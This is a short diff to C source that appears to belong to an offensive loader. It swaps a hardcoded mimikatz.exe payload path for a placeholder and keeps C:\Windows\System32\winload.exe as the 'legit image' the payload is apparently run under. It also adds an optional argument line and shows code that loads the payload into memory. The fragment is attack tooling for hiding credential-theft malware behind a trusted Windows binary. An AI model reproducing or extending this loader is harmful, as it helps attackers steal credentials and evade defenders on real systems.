@@ -8,9 +8,9 @@
 
 NtApiFunctionTable GlobalNtApiTable = { 0 };
 
-#define PAYLOAD_PATH L"D:\\downloads\\mimikatz_trunk\\x64\\mimikatz.exe"
+#define PAYLOAD_PATH L"Type Your Payload Path Here"
 #define LEGIT_IMAGE_PATH L"C:\\Windows\\System32\\winload.exe"
-#define COMMAND_ARGUMENT L"coffee"
+#define COMMAND_ARGUMENT L"NULL" // if paylaod take argument
 
 int main() {
     HMODULE ntdllHandle;
@@ -77,6 +77,8 @@ int main() {
 
     printf("[+] Created Temp Path: %ws\n", tempFileName);
     swprintf_s(tempFilePath, MAX_PATH * 2, L"%s", tempFileName);
+    // swprintf_s(tempFilePath, MAX_PATH * 2, L"%s %s", tempFileName,COMMAND_ARGUMENT); // for argument
+    
 
     if (!LoadFileIntoMemory(PAYLOAD_PATH, &payloadBuffer, &payloadSize)) {
         fprintf(stderr, "[-] LoadFileIntoMemory Failed \n");
